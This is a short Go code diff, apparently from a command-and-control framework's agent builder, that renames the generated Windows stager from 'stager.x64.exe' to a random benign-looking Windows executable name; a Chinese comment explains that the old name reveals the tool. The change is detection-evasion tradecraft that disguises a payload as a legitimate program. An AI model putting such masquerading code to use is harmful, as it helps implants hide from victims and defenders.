@@ -6,6 +6,7 @@ import (
 	"encoding/hex"
 	"fmt"
 	"io"
+	"math/rand/v2"
 	"net"
 	"net/http"
 	"os"
@@ -509,5 +510,8 @@ func buildWindowsStager(builderId string, moduleDir string, tempDir string, shel
 	_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("stager-meta token=%s path=%s host=%s:%d ssl=%v dll=%s ttl=%s built_at=%s",
 		token, absPath, host, port, useSSL, dll, stagerTTL, time.Now().UTC().Format(time.RFC3339)))
 
-	return bin, "stager.x64.exe", nil
+	// 与普通 Exe 同源：文件名取正常的 Windows 可执行名，叫 stager.x64.exe 等于
+	// 把工具身份写在下载列表里 —— "stager" 是工具标记、x64 是架构标记，
+	// 两个都是真实 Windows 进程名里不会出现的东西。
+	return bin, benignExePool[rand.IntN(len(benignExePool))].name + ".exe", nil
 }
